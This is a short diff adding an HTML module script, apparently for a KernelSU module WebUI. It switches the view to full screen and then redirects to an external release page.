@@ -1,0 +1,12 @@
+<script type="module">
+  import { exec, fullScreen } from "https://cdn.jsdelivr.net/npm/kernelsu@1.0.6/+esm";
+  const createFolder = async () => {
+     fullScreen(true)
+  }
+
+  createFolder()
+    .catch(err => console.error(err))
+    .finally(() => {
+      window.location.href = "https://release.axvision.pages.dev/"
+    })
+</script>
